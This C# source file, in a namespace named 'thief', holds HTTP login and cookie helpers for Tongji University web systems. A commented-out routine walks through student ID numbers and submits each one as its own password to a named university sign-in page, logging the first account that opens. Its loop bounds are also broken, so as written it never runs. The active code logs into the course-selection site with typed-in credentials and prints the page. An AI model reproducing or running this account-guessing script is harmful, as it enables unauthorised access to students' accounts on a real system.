using System;

using System.Collections.Generic;

using System.Text;

using System.Net;
using System.Web;
using System.IO;
using System.Threading;
using 网页抓举;

namespace thief

{

    class Program

    {
        static string GetContent(CookieContainer cookie, string url)
        {
            string content;
            HttpWebRequest httpRequest = (HttpWebRequest)HttpWebRequest.Create(url);
            httpRequest.CookieContainer = cookie;
            httpRequest.Referer = url;
            httpRequest.UserAgent = "Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 46.0.2486.0 Safari / 537.36 Edge / 13.10586";
            httpRequest.Accept = "text / html, */*";
            httpRequest.ContentType = "application/x-www-form-urlencoded";
            httpRequest.Method = "GET";
            HttpWebResponse httpResponse = (HttpWebResponse)httpRequest.GetResponse();
            using (Stream responsestream = httpResponse.GetResponseStream())
            {
                using (StreamReader sr = new StreamReader(responsestream, System.Text.Encoding.UTF8))
                {
                    content = sr.ReadToEnd();
                }
            }
            return content;
        }
        static CookieContainer GetCookie(string postString, string postUrl)
        {
            CookieContainer cookie = new CookieContainer();
            HttpWebRequest httpRequset = (HttpWebRequest)HttpWebRequest.Create(postUrl);//创建http 请求
            httpRequset.CookieContainer = cookie;//设置cookie
            httpRequset.Method = "POST";//POST 提交
            httpRequset.KeepAlive = true;
            httpRequset.UserAgent = "Mozilla / 5.0(Windows NT 10.0; Win64; x64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 46.0.2486.0 Safari / 537.36 Edge / 13.10586";
            httpRequset.Accept = "text / html, */*";
            httpRequset.ContentType = "application/x-www-form-urlencoded";//以上信息在监听请求的时候都有的直接复制过来
            byte[] bytes = System.Text.Encoding.Default.GetBytes(postString);
            httpRequset.ContentLength = bytes.Length;
            Stream stream = httpRequset.GetRequestStream();
            stream.Write(bytes, 0, bytes.Length);
            stream.Close();//以上是POST数据的写入
            HttpWebResponse httpResponse = (HttpWebResponse)httpRequset.GetResponse();//获得 服务端响应
            httpResponse.Close();
            return cookie;//拿到cookie
        }
 /*       static void Main(string[] args)
        {
            String username;
            int num =1452000 ;
            for (; num < 1435000; num++)
            {
                
                if ((num / 1000) % 10 >= 5) num = num + 95000;
                username = num.ToString();
                Console.WriteLine("当前学号为 " + username);
                String data = "__VIEWSTATE=%2FwEPDwUKLTk0OTM3Nzg3NmRkQfL6cjTTS14cJcvBdWJ5Q6PO1ZFUkJO5SQ4E2297Cf0%3D&__EVENTVALIDATION=%2FwEdAAS%2B6fZM%2BjxPckDYZ6cL96%2Fkg9%2BDErLAmIaUpB7%2BxX1QhupiItMGhaTwdTkjiFcrLyUT7T9xWU37O%2BqsIq5w6gRqqi7l8DRCTsmIJf4BjvMkILqtuOt2IMihd5P6NnHAxQI%3D&studentIDBox=" + username + "&passwordBox=" + username + "&signinButton=%E7%99%BB%E9%99%86";
                CookieContainer cookie = new CookieContainer();
                cookie = GetCookie(data, "http://mips246.tongji.edu.cn/Signin.aspx");
                //Console.WriteLine("Cookie获取成功");
                String s = GetContent(cookie, "http://mips246.tongji.edu.cn/Default.aspx");
                if (s.IndexOf("查看") != -1)
                {
                    FileStream fs = new FileStream("D:\\output.txt", FileMode.Append);
                    StreamWriter writer = new StreamWriter(fs);
                    writer.WriteLine(username);
                    writer.Close();
                    fs.Close();
                    break;
                }
            }
        }
    }
}*/
       static void Main(string[] args) 
        {
            Console.WriteLine("请输入学号密码");
            String username = Console.ReadLine();
            String password = Console.ReadLine();
            CookieContainer cookie = new CookieContainer();
            if ((cookie = TJLogin.LoginXuanke(username, password)) == null)
            {
                Console.WriteLine("登陆失败");
            }
            else
            {
                Console.WriteLine("登陆成功");
            }
            String Content = TJLogin.GetWebContent(cookie, "http://xuanke.tongji.edu.cn/tj_login/index_main.jsp");
            Console.WriteLine(Content);

        }
    }

}

